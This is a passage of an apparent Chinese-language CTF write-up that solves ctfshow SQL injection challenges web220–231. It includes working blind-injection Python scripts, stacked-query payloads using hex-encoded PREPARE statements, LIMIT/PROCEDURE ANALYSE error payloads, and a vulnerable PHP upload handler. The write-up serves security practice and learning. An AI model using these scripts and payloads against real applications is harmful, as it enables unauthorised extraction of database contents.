print(payload)</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time=time.time()</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        last_time=time.time()-start_time</span><br><span class="line">        <span class="keyword">if</span> last_time&gt;right_time:</span><br><span class="line">            tail=mid</span><br><span class="line">            <span class="comment"># print(&quot;right&quot;)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line">            <span class="comment"># print(&quot;wrong&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">        target+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>还是用笛卡尔积，但是过滤了好多函数，我们用其他函数来绕过一下，所以我们二分法也用不了了，只能遍历了，改改脚本，这里可以用<code>left\right\mid\substring</code>，只不过切片的写法和结果不同，还有一个注意的点就是这几个函数都不能和<code>group_concat</code>共用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">left</span>((<span class="keyword">select</span> flagaabcc <span class="keyword">from</span> ctfshow_flagxcac limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>) <span class="operator">=</span> <span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">(<span class="keyword">right</span>((<span class="keyword">select</span> flagaabcc <span class="keyword">from</span> ctfshow_flagxcac limit <span class="number">0</span>,<span class="number">1</span>), <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;c&#x27;</span></span><br><span class="line">(mid((<span class="keyword">select</span> flagaabcc <span class="keyword">from</span> ctfshow_flagxcac limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span></span><br><span class="line">(<span class="built_in">substring</span>((<span class="keyword">select</span> flagaabcc <span class="keyword">from</span> ctfshow_flagxcac limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">3</span>)<span class="operator">=</span><span class="string">&#x27;ctf&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7630ebf6-7c41-4d1c-9c58-d11e3fdc7946.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">right_time=<span class="number">0.8</span></span><br><span class="line">sleep=<span class="string">&quot;(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I)&quot;</span></span><br><span class="line">strings=<span class="string">&quot;_-&#123;&#125;&quot;</span>+string.ascii_uppercase+string.ascii_lowercase+string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        temp_target = target + s</span><br><span class="line">        <span class="comment"># payload = &quot;1) or if((left((select database()),&#123;0&#125;)=&#x27;&#123;1&#125;&#x27;),&#123;2&#125;,0)-- +&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, temp_target, sleep)</span></span><br><span class="line">        <span class="comment"># ctfshow</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if((left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;)=&#x27;&#123;1&#125;&#x27;),&#123;2&#125;,0)-- +&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, temp_target, sleep)</span></span><br><span class="line">        <span class="comment"># ctfshow_flagxcac</span></span><br><span class="line">        <span class="comment"># payload = &quot;1) or if((left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;0&#125;)=&#x27;&#123;1&#125;&#x27;),&#123;2&#125;,0)-- +&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, temp_target, sleep)</span></span><br><span class="line">        <span class="comment"># flagaabcc</span></span><br><span class="line">        payload = <span class="string">&quot;1) or if((left((select flagaabcc from ctfshow_flagxcac limit 0,1),&#123;0&#125;)=&#x27;&#123;1&#125;&#x27;),&#123;2&#125;,0)-- +&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, temp_target, sleep)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        last_time = time.time() - start_time</span><br><span class="line">        <span class="keyword">if</span> last_time &gt; right_time:</span><br><span class="line">            <span class="comment"># print(&quot;gogogo&quot;)</span></span><br><span class="line">            target=temp_target</span><br><span class="line">            <span class="built_in">print</span>(target.lower())</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(target.lower())</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>limit注入，有版本限制，当时wolvctf2025的时候我看过一篇<a target="_blank" rel="noopener" href="https://lightless.me/archives/111.html">文章</a>，算是浅浅的了解了一下，主要就是利用报错注入和时间盲注，写写payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">User</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> Host <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> Host LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">User</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> Host <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> Host LIMIT <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(rand(),concat(<span class="number">0x3a</span>,(IF(MID(version(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, BENCHMARK(<span class="number">100000000</span>,SHA1(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250502-114938.jpg" alt="1"></p>
<p>打入即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?page=1&amp;limit=1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,BENCHMARK(10000000,SHA1(1)))),1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?page=1&amp;limit=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000000,SHA1(1)),1))))),1);</span><br></pre></td></tr></table></figure>

<p>但是好像没有select，所以不成功，不然也不会只让拿库名了，报错可以直接打到所有</p>
<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><p>有两种方法，一种是报错一种是sleep</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(sleep(<span class="number">0.10</span>),<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> concat(if(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>,&quot;username&quot;,cot(<span class="number">0</span>)));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/api/?u=concat((if(ascii(substr((select database()),1,1))&lt;100, sleep(0.05), 0)), 1)</span><br><span class="line">/api/?u=concat((if(ascii(substr((select database()),1,1)&lt;100), sleep(0.05),0)),1)</span><br><span class="line"></span><br><span class="line">/api/?u=concat((if(ascii(substr((select database()),1,1))&lt;100, 1, cot(0))), 1)</span><br></pre></td></tr></table></figure>

<p>写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://333e3c35-f236-4d29-b6e1-65d85739e14f.challenge.ctf.show/api/?u=&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head =<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt; tail:</span><br><span class="line">        mid=(head+tail)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># payload=&quot;concat((if(ascii(substr((select database()),&#123;0&#125;,1))&lt;&#123;1&#125;, 1, cot(0))), 1)&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;concat((if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;0&#125;,1))&lt;&#123;1&#125;, 1, cot(0))), 1)&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># ctfshow_flaga</span></span><br><span class="line">        <span class="comment"># payload = &quot;concat((if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;0&#125;,1))&lt;&#123;1&#125;, 1, cot(0))), 1)&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, mid)</span></span><br><span class="line">        <span class="comment"># id,flagaabc,info</span></span><br><span class="line">        payload = <span class="string">&quot;concat((if(ascii(substr((select flagaabc from ctfshow_flaga),&#123;0&#125;,1))&lt;&#123;1&#125;, 1, cot(0))), 1)&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            i, mid)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        r=requests.get(url=url+payload)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;pass&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tail=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<p>时间盲注的脚本也是随便写，这里我就不写了</p>
<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>把数字过滤了，而且我好像写<code>cot(false)</code>也不能成功，换了一种payload，<code>if(true,username,&#39;a&#39;)</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://2504134b-26db-45be-a355-a67ef4c37b8b.challenge.ctf.show/api/&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">target=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    head =<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head+<span class="number">1</span>&lt; tail:</span><br><span class="line">        mid=(head+tail)//<span class="number">2</span></span><br><span class="line">        position=createNum(i)</span><br><span class="line">        Mid_True=createNum(mid)</span><br><span class="line"></span><br><span class="line">        mid=(head+tail)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((database()),&#123;0&#125;,true))&lt;&#123;1&#125;,username,false)&quot;.format(position,Mid_True)</span></span><br><span class="line">        <span class="comment"># ctfshow_web</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctfshow_web&#x27;),&#123;0&#125;,true))&lt;&#123;1&#125;,username,false)&quot;.format(</span></span><br><span class="line">        <span class="comment">#     position, Mid_True)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># ctfshow_flagas</span></span><br><span class="line">        <span class="comment"># payload = &quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;),&#123;0&#125;,true))&lt;&#123;1&#125;,username,false)&quot;.format(</span></span><br><span class="line">        <span class="comment">#     position, Mid_True)</span></span><br><span class="line">        <span class="comment"># id,flagasabc</span></span><br><span class="line">        payload = <span class="string">&quot;if(ascii(substr((select flagasabc from ctfshow_flagas),&#123;0&#125;,true))&lt;&#123;1&#125;,username,false)&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            position,Mid_True)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        params=&#123;<span class="string">&quot;u&quot;</span>:payload&#125;</span><br><span class="line">        r=requests.get(url,params)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;passwordAUTO&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tail=mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head=mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(target)</span><br></pre></td></tr></table></figure>

<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>访问<code>/robots.txt</code>，得到<code> /pwdreset.php</code>，上传恶意bin文件实现getshell，看文件知道注入的问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">10</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;文件过大: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>))) . <span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">    <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>, <span class="variable">$filetype</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&#x27;,&#x27;&quot;</span> . <span class="variable">$filetype</span> . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$con</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那这个闭合就完事了</p>
<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>SUCTF2019的一道题我记得是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api?username=-1&#x27;;show tables;--+</span><br><span class="line">/api?username=-1&#x27;;handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;--+</span><br></pre></td></tr></table></figure>

<p>还是比较S的姿势当时</p>
<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><p>使用<code>prepare</code>预编译一个语句，再<code>execute</code>执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73686f772020646174616261736573;execute abcd;#</span><br><span class="line"> </span><br><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73686F77207461626C6573;execute abcd;#</span><br><span class="line"></span><br><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;execute </span><br><span class="line">abcd;#</span><br></pre></td></tr></table></figure>

<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p><code>Routines</code> 是information_schema中的一个表，存储所有存储过程和函数的定义信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.Routines <span class="keyword">WHERE</span> ROUTINE_NAME <span class="operator">=</span> <span class="string">&#x27;sp_name&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73656C656374202A2066726F6D20696E666F726D6174696F6E5F736368656D612E526F7574696E6573;execute </span><br><span class="line">abcd;#</span><br></pre></td></tr></table></figure>

<h2 id="web228"><a href="#web228" class="headerlink" title="web228"></a>web228</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=-1&#x27;;PREPARE a from 0x73656C656374202A2066726F6D2063746673685F6F775F666C616761736161</span><br><span class="line">;execute a;#</span><br></pre></td></tr></table></figure>

<h2 id="web229"><a href="#web229" class="headerlink" title="web229"></a>web229</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73686f772020646174616261736573;execute abcd;#</span><br><span class="line"> </span><br><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73686F77207461626C6573;execute abcd;#</span><br><span class="line"></span><br><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73656c656374202a2066726f6d20666c6167;execute </span><br><span class="line">abcd;#</span><br></pre></td></tr></table></figure>

<h2 id="web230"><a href="#web230" class="headerlink" title="web230"></a>web230</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/api/?username=-1&#x27;;PREPARE abcd from 0x73656c656374202a2066726f6d20666c61676161626278;execute </span><br><span class="line">abcd;#</span><br></pre></td></tr></table></figure>

<h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><p>路由是<code>/api/</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;update ctfshow_user set pass = &#x27;&#123;$password&#125;&#x27; where username = &#x27;&#123;$username&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>

<p>update注入，在改变密码的同时将username也改变，插入Sql语句</p>
